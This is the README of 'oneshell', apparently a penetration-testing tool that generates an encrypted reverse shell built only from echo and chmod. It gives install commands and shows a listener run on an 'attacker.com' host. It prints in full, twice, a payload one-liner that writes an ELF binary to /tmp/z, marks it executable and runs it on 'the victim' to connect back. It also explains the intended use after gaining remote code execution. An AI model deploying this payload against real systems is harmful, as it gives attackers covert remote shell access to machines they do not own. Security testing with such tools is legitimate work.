# One Shell To Rule Them All

![image](https://github.com/user-attachments/assets/4a390578-47cb-423a-87ca-ad681a46731c)

# Blog

For a detailed explanation of how the tool works, check out my blog on the topic [here](https://tantosec.com/blog/oneshell/).

# Installation

**Local install**

```bash
go install github.com/tantosec/oneshell@latest
```

**Prebuilt binary**

Download a binary from [the releases page.](https://github.com/tantosec/oneshell/releases)

**Docker**

Replace `oneshell` commands with the following:

```bash
docker run --rm -it -p 9001:9001 tantosec/oneshell
```

> Remember to update the value of the `-p` option to the port you are using.

# Basic Usage

If you want your payload to connect back to `localhost` on port `9001`, run the following command:

```bash
oneshell -t localhost -p 9001
```

In the real world, you will probably have an internet accessible server (for example `attacker.com`) with a firewall that allows port `9001` through. As you want the victim to connect back to `attacker.com`, you will run a command like this on the `attacker.com` machine:

```bash
oneshell -t attacker.com -p 9001
```

You should receive output similar to the following:

```
Generating temporary MTLS certificates...
Payload connects to 127.0.0.1:9001
Copy the following command and run on victim:

zy(){ if [ `echo -e` ];then echo "$1";else echo -e "$1";fi;};zy '\0177ELF\02\01\01\0\0\0\0\0\0\0\0\0\02\0>\0\01\0\0\0x\0200\02\0\0\0\0\0@\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0@\0\070\0\01\0@\0\0\0\0\0\01\0\0\0\07\0\0\0\0\0\0\0\0\0\0\0\0\0200\02\0\0\0\0\0\0\0200\02\0\0\0\0\0l\01\0\0\0\0\0\0\0354i\013\0\0\0\0\0\0\0 \0\0\0\0\0\061\0300\0260)\0277\02\0\0\0\0276\01\0\0\0\061\0322\017\05I\0211\0307\0211\0307\0276d\0201\02\0\061\0322\0262\020\061\0300\0260*\017\05\0272\0210h\013\0\061\0300\017\05)\0302\01\0306\0203\0372\0w\0363\0277\021m\01\0H\0272d\0201\02\0\0\0\0\0H\0203\0377\0\017\0216\0205\0\0\0H\0213\02H\0213\034%>\0201\02\0H1\0330H\0211\04%>\0201\02\0H1\0300H1\0311\0276\0\0\0\0\0212\04%>\0201\02\0H\0201\0376\0\01\0\0s3@\0210\0361H\0203\0341\07\02\0201\066\0201\02\0H%\0377\0\0\0\0212\0200\0\0200\02\0H\0377\0301H\0203\0341\07\02\0201>\0201\02\0\0320\0300\0210\0201>\0201\02\0H\0377\0306\0353\0304H\0203\0302\010H\0377\0317\0353\0211k.Yc3\0255`OMw\0236K\0210\0256E\0323#\02\0271\0247l\0277\0372uH\0213\04%>\0201\02\0H\0213\034%F\0201\02\0H9\0330t\01\0314\02\0#)\0177\0\0\01'>/tmp/z;chmod +x /tmp/z;/tmp/z

2024/07/15 15:51:17 Listening for connections on 0.0.0.0:9001
```

Copy the part that says

```
zy(){ if [ `echo -e` ];then echo "$1";else echo -e "$1";fi;};zy '\0177ELF\02\01\01\0\0\0\0\0\0\0\0\0\02\0>\0\01\0\0\0x\0200\02\0\0\0\0\0@\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0@\0\070\0\01\0@\0\0\0\0\0\01\0\0\0\07\0\0\0\0\0\0\0\0\0\0\0\0\0200\02\0\0\0\0\0\0\0200\02\0\0\0\0\0l\01\0\0\0\0\0\0\0354i\013\0\0\0\0\0\0\0 \0\0\0\0\0\061\0300\0260)\0277\02\0\0\0\0276\01\0\0\0\061\0322\017\05I\0211\0307\0211\0307\0276d\0201\02\0\061\0322\0262\020\061\0300\0260*\017\05\0272\0210h\013\0\061\0300\017\05)\0302\01\0306\0203\0372\0w\0363\0277\021m\01\0H\0272d\0201\02\0\0\0\0\0H\0203\0377\0\017\0216\0205\0\0\0H\0213\02H\0213\034%>\0201\02\0H1\0330H\0211\04%>\0201\02\0H1\0300H1\0311\0276\0\0\0\0\0212\04%>\0201\02\0H\0201\0376\0\01\0\0s3@\0210\0361H\0203\0341\07\02\0201\066\0201\02\0H%\0377\0\0\0\0212\0200\0\0200\02\0H\0377\0301H\0203\0341\07\02\0201>\0201\02\0\0320\0300\0210\0201>\0201\02\0H\0377\0306\0353\0304H\0203\0302\010H\0377\0317\0353\0211k.Yc3\0255`OMw\0236K\0210\0256E\0323#\02\0271\0247l\0277\0372uH\0213\04%>\0201\02\0H\0213\034%F\0201\02\0H9\0330t\01\0314\02\0#)\0177\0\0\01'>/tmp/z;chmod +x /tmp/z;/tmp/z
```

and run it on the victim. You should receive an interactive shell connection on the server, which will be secured with mutual TLS.

# Why?

Let's say that you have achieved remote code execution on a target machine and are looking to escalate your privileges. You might think to establish a reverse shell to make this process easier.
However, being a security professional, you want your connection to be encrypted to prevent data being transferred insecurely.

It turns out that there are a few ways to do this, mostly involving the `openssl` or `ncat` tools. What if you don't have these tools on the target? One solution is to download them over the internet using `curl` or `wget`. But what if the target doesn't have these binaries either? The base `ubuntu` Docker image doesn't.

"One Shell To Rule Them All", or `oneshell` for short, is a tool that can solve this problem. It does this by running an encrypted reverse shell using only the `echo` and `chmod` commands.

# Detailed requirements for a successful payload

* Target can connect to your listener via TCP
* Shell execution on the target (for example `system` in PHP)
    * This will allow using the `echo` inbuilt shell command
* x86_64 CPU (Arm64 support coming soon)
* `chmod` binary located on path
* The ability to write to the following file paths: `/tmp/x`, `/tmp/y`, `/tmp/z`

These conditions cover almost all server setups.

# References

* Basis for Tiny ELF file from [https://nathanotterness.com/2021/10/tiny_elf_modernized.html](https://nathanotterness.com/2021/10/tiny_elf_modernized.html)
* AES implementation sourced from [https://github.com/mko-x/SharedAES-GCM/tree/master/Sources](https://nathanotterness.com/2021/10/tiny_elf_modernized.html)
